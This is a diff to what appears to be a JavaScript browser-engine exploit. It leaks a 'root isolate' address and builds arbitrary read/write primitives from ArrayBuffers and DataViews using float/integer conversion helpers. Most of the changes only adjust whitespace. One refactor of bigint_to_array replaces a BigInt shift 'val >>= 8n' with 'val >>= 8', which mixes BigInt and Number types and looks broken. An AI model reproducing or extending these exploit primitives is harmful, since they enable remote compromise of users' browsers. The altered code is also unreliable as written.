@@ -110,7 +110,7 @@
                 console.log("[+] Root Isolate: 0x" + ftoi(root_isolate).toString(16));
 
                 // creating a set of temporary AB to create (GC unsafe) arb read/write primitives
-		        // that allows an qword to be read/written to an 8 byte unboxed address (not possible with weak_write)
+		// that allows an qword to be read/written to an 8 byte unboxed address (not possible with weak_write)
                 
                 let bff = new ArrayBuffer(8)
                 let bff1 = new ArrayBuffer(8)
@@ -133,7 +133,7 @@
                         backing_store_addr_=backing_store_addr, 
                         root_isolate_=root_isolate) {                    
                     if (boxed && ftoi(addr) % 2n != 0) {
-		                addr = itof(ftoi(root_isolate_) | ftoi(addr) -1n);
+		        addr = itof(ftoi(root_isolate_) | ftoi(addr) -1n);
 	            }
                     dataview1.setBigUint64(0, ftoi(addr), true);
                 }
@@ -316,10 +316,9 @@
 
                     function bigint_to_array(val) {
                         var arr = [0, 0, 0, 0, 0, 0, 0, 0];
-                        for ( var i = 0; i < arr.length; i++ ) {
+                        for ( var i = 0; i < arr.length; i++, val >>= 8) {
                             let byte = Number(val & 0xffn);
                             arr[i] = byte;
-                            val >>= 8n;
                         }
                         return arr;
                     };
